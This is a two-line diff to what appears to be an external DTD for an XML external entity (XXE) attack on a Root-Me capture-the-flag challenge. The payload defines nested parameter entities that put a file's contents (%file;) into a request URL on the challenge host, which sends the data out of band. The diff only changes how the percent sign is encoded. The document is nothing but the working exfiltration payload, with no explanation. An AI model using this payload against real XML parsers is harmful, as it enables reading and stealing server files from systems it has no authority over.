@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://challenge01.root-me.org/web-serveur/ch29/index.php?action=%file;'>">
+<!ENTITY % all "<!ENTITY % send SYSTEM 'http://challenge01.root-me.org/web-serveur/ch29/index.php?action=%file;'>">
 %all;
